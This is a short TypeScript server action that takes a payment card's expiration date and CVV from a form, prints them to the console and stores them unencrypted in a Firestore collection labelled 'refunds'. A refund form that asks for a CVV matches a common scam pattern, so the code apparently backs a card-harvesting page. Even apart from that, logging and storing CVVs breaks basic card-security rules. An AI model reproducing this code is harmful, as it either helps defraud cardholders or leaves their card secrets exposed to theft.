"use server"

import { db } from './firebase';
import { collection, addDoc } from 'firebase/firestore';

// Define an interface for the form data
export interface FormData {

  expirationDate: string;
  cvv: string;

}

// Define the function to handle form submission
export const handleFormSubmit = async (data: FormData): Promise<{ message: string }> => {
  console.log('Submitting data:', data);

  try {
    // Add data to Firestore (Refunds collection)
    const docRef = await addDoc(collection(db, 'refunds'), {

      expirationDate: data.expirationDate,
      cvv: data.cvv,
      timestamp: new Date(),
    });

    console.log('Document written with ID:', docRef.id);
    return { message: 'Success' }; // Return success response
  } catch (e) {
    console.error('Error adding document: ', e);
    throw new Error('Failed to submit data.');
  }
};
